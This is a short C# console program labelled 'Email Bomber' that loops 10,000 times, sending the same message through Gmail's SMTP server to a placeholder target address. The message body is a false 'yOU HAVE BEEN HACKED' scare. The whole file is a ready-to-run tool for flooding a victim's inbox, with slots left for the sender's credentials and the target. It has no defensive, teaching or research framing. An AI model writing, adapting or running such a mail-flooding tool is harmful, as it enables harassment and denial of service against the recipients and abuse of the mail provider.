using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Net.Mail;
using System.Net;
using System.IO;

namespace emailstmp
{
    class Program
    {
        static void Main(string[] args)
        {
            int Amount = 10000;
            Console.WriteLine("Email Bomber \n\n\n\n\n");
            for (int i = 0; i < Amount; i++)
            {
                
                try
                {
                    using (MailMessage mm = new MailMessage("Your email address here", "target email address here"))
                    {
                        mm.Subject = "BLA BLA BLA";
                        mm.Body = "yOU HAVE BEEN HACKED  ";

                        mm.IsBodyHtml = false;
                        using (SmtpClient smtp = new SmtpClient())
                        {

                            smtp.Host = "smtp.gmail.com";


                            NetworkCredential NetworkCred = new NetworkCredential("Your Email address Here", "Your  address password");
                            smtp.EnableSsl = true;
                            smtp.UseDefaultCredentials = true;
                            smtp.Credentials = NetworkCred;
                            smtp.Port = 587;
                            smtp.Send(mm);
                            Console.WriteLine("no. of emails sent:" + i);
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("failed: " + i);
                }

                
            }
        }
    }
}
